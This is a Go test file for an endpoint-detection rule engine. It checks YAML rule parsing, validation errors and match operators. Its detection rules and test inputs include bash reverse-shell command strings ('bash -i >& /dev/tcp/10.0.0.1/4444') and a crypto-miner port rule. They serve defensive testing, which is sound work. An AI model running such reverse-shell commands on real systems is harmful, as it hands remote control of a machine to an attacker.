package rule

import (
	"testing"

	"gopkg.in/yaml.v3"
)

const validRuleYAML = `
schema_version: 1
id: MXEDR-0001
name: reverse_shell_bash_dev_tcp
version: 2
category: process
severity: critical
mitre:
  tactic: execution
  technique: T1059.004
tags: [reverse_shell, post_exploitation]
agent:
  enabled: true
  action: alert
  enforce: false
  match:
    event_type: process_exec
    conditions:
      - field: cmdline
        op: regex
        value: "bash\\s+-i\\s+>&\\s+/dev/tcp/"
      - field: cmdline
        op: contains
        value: "0>&1"
    logic: and
metadata:
  author: mxcwpp-team
  description: "Detects reverse shells via bash -i >& /dev/tcp/"
  confidence: 95
`

func TestRuleParseAndValidate(t *testing.T) {
	var r Rule
	if err := yaml.Unmarshal([]byte(validRuleYAML), &r); err != nil {
		t.Fatalf("YAML parse: %v", err)
	}
	if err := r.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}

	if r.ID != "MXEDR-0001" {
		t.Errorf("ID = %q", r.ID)
	}
	if r.Severity != SeverityCritical {
		t.Errorf("Severity = %q", r.Severity)
	}
	if r.Agent.Match.EventType != "process_exec" {
		t.Errorf("EventType = %q", r.Agent.Match.EventType)
	}
	if len(r.Agent.Match.Conditions) != 2 {
		t.Fatalf("conditions count = %d", len(r.Agent.Match.Conditions))
	}
	// Regex should be compiled after Validate.
	if r.Agent.Match.Conditions[0].compiledRegex == nil {
		t.Error("regex condition not compiled")
	}
	if r.Metadata.Confidence != 95 {
		t.Errorf("Confidence = %d", r.Metadata.Confidence)
	}
}

func TestRuleValidateDefaults(t *testing.T) {
	r := Rule{
		ID: "TEST-001", Name: "test", Version: 1,
		Category: "process", Severity: SeverityHigh,
		Agent: AgentMatch{
			Enabled: true,
			Match: MatchSpec{
				EventType: "process_exec",
				Conditions: []Condition{
					{Field: "exe", Op: OpEquals, Value: "/usr/bin/curl"},
				},
			},
		},
	}
	if err := r.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}
	// Default schema version.
	if r.SchemaVersion != CurrentSchemaVersion {
		t.Errorf("SchemaVersion = %d", r.SchemaVersion)
	}
	// Default action.
	if r.Agent.Action != ActionAlert {
		t.Errorf("Action = %q, want alert", r.Agent.Action)
	}
	// Default logic.
	if r.Agent.Match.Logic != LogicAnd {
		t.Errorf("Logic = %q, want and", r.Agent.Match.Logic)
	}
}

func TestRuleValidateErrors(t *testing.T) {
	tests := []struct {
		name string
		rule Rule
		want string
	}{
		{
			name: "missing ID",
			rule: Rule{Name: "x", Version: 1, Category: "p", Severity: SeverityLow},
			want: "rule id is required",
		},
		{
			name: "missing name",
			rule: Rule{ID: "X", Version: 1, Category: "p", Severity: SeverityLow},
			want: "name is required",
		},
		{
			name: "bad version",
			rule: Rule{ID: "X", Name: "x", Version: 0, Category: "p", Severity: SeverityLow},
			want: "version must be >= 1",
		},
		{
			name: "bad severity",
			rule: Rule{ID: "X", Name: "x", Version: 1, Category: "p", Severity: "extreme"},
			want: "invalid severity",
		},
		{
			name: "bad schema version",
			rule: Rule{SchemaVersion: 99, ID: "X", Name: "x", Version: 1, Category: "p", Severity: SeverityLow},
			want: "unsupported schema_version",
		},
		{
			name: "missing event_type",
			rule: Rule{
				ID: "X", Name: "x", Version: 1, Category: "p", Severity: SeverityLow,
				Agent: AgentMatch{Enabled: true, Match: MatchSpec{
					Conditions: []Condition{{Field: "f", Op: OpEquals, Value: "v"}},
				}},
			},
			want: "event_type is required",
		},
		{
			name: "empty conditions",
			rule: Rule{
				ID: "X", Name: "x", Version: 1, Category: "p", Severity: SeverityLow,
				Agent: AgentMatch{Enabled: true, Match: MatchSpec{EventType: "e"}},
			},
			want: "conditions must not be empty",
		},
		{
			name: "bad operator",
			rule: Rule{
				ID: "X", Name: "x", Version: 1, Category: "p", Severity: SeverityLow,
				Agent: AgentMatch{Enabled: true, Match: MatchSpec{
					EventType:  "e",
					Conditions: []Condition{{Field: "f", Op: "nope", Value: "v"}},
				}},
			},
			want: "invalid operator",
		},
		{
			name: "bad regex",
			rule: Rule{
				ID: "X", Name: "x", Version: 1, Category: "p", Severity: SeverityLow,
				Agent: AgentMatch{Enabled: true, Match: MatchSpec{
					EventType:  "e",
					Conditions: []Condition{{Field: "f", Op: OpRegex, Value: "(unclosed"}},
				}},
			},
			want: "invalid regex",
		},
		{
			name: "in without values",
			rule: Rule{
				ID: "X", Name: "x", Version: 1, Category: "p", Severity: SeverityLow,
				Agent: AgentMatch{Enabled: true, Match: MatchSpec{
					EventType:  "e",
					Conditions: []Condition{{Field: "f", Op: OpIn}},
				}},
			},
			want: "non-empty values list",
		},
		{
			name: "agent disabled passes",
			rule: Rule{
				ID: "X", Name: "x", Version: 1, Category: "p", Severity: SeverityLow,
				Agent: AgentMatch{Enabled: false},
			},
			want: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.rule.Validate()
			if tt.want == "" {
				if err != nil {
					t.Errorf("expected no error, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatal("expected error")
			}
			if got := err.Error(); !contains(got, tt.want) {
				t.Errorf("error = %q, want substring %q", got, tt.want)
			}
		})
	}
}

func TestConditionEvaluate(t *testing.T) {
	tests := []struct {
		name  string
		cond  Condition
		input string
		want  bool
	}{
		{"equals match", Condition{Op: OpEquals, Value: "bash"}, "bash", true},
		{"equals miss", Condition{Op: OpEquals, Value: "bash"}, "sh", false},
		{"not_equals match", Condition{Op: OpNotEquals, Value: "bash"}, "sh", true},
		{"not_equals miss", Condition{Op: OpNotEquals, Value: "bash"}, "bash", false},
		{"contains match", Condition{Op: OpContains, Value: "/dev/tcp"}, "bash -i >& /dev/tcp/1.2.3.4", true},
		{"contains miss", Condition{Op: OpContains, Value: "/dev/tcp"}, "curl http://example.com", false},
		{"starts_with match", Condition{Op: OpStartsW, Value: "/tmp/"}, "/tmp/evil", true},
		{"starts_with miss", Condition{Op: OpStartsW, Value: "/tmp/"}, "/var/tmp/ok", false},
		{"ends_with match", Condition{Op: OpEndsW, Value: ".sh"}, "/tmp/evil.sh", true},
		{"ends_with miss", Condition{Op: OpEndsW, Value: ".sh"}, "/tmp/evil.py", false},
		{"in match", Condition{Op: OpIn, Values: []string{"bash", "sh", "zsh"}}, "sh", true},
		{"in miss", Condition{Op: OpIn, Values: []string{"bash", "sh", "zsh"}}, "fish", false},
		{"gt match", Condition{Op: OpGT, Value: "1024"}, "8080", true},
		{"gt miss", Condition{Op: OpGT, Value: "1024"}, "80", false},
		{"lt match", Condition{Op: OpLT, Value: "1024"}, "80", true},
		{"lt miss", Condition{Op: OpLT, Value: "1024"}, "8080", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.cond.Evaluate(tt.input); got != tt.want {
				t.Errorf("Evaluate(%q) = %v, want %v", tt.input, got, tt.want)
			}
		})
	}
}

func TestConditionEvaluateRegex(t *testing.T) {
	c := Condition{
		Field: "cmdline",
		Op:    OpRegex,
		Value: `bash\s+-i\s+>&\s+/dev/tcp/`,
	}
	// Must compile first.
	if err := c.validate("test", 0); err != nil {
		t.Fatalf("validate: %v", err)
	}

	if !c.Evaluate("bash -i >& /dev/tcp/10.0.0.1/4444") {
		t.Error("expected match")
	}
	if c.Evaluate("curl http://example.com") {
		t.Error("expected no match")
	}
}

func TestConditionCostOrdering(t *testing.T) {
	conditions := []Condition{
		{Op: OpRegex, Value: ".*", Field: "a"},
		{Op: OpEquals, Value: "x", Field: "b"},
		{Op: OpContains, Value: "y", Field: "c"},
	}
	for i := range conditions {
		_ = conditions[i].validate("test", i)
	}
	// Verify costs assigned.
	if conditions[0].cost != 10 {
		t.Errorf("regex cost = %d, want 10", conditions[0].cost)
	}
	if conditions[1].cost != 1 {
		t.Errorf("equals cost = %d, want 1", conditions[1].cost)
	}
	if conditions[2].cost != 3 {
		t.Errorf("contains cost = %d, want 3", conditions[2].cost)
	}
}

func TestYAMLMultipleRules(t *testing.T) {
	yamlData := `
schema_version: 1
id: MXEDR-0042
name: crypto_miner_stratum
version: 1
category: network
severity: high
agent:
  enabled: true
  action: kill
  enforce: false
  match:
    event_type: tcp_connect
    conditions:
      - field: remote_port
        op: in
        values: ["3333", "4444", "5555", "7777", "8888", "9999"]
      - field: exe
        op: not_equals
        value: /usr/local/mxcwpp/mxcwpp-agent
    logic: and
`
	var r Rule
	if err := yaml.Unmarshal([]byte(yamlData), &r); err != nil {
		t.Fatalf("YAML parse: %v", err)
	}
	if err := r.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}
	if r.Agent.Action != ActionKill {
		t.Errorf("Action = %q", r.Agent.Action)
	}
	if r.Agent.Enforce {
		t.Error("Enforce should be false")
	}
	if len(r.Agent.Match.Conditions[0].Values) != 6 {
		t.Errorf("in values count = %d", len(r.Agent.Match.Conditions[0].Values))
	}
}

func contains(s, sub string) bool {
	return len(sub) > 0 && len(s) >= len(sub) && searchSubstring(s, sub)
}

func searchSubstring(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
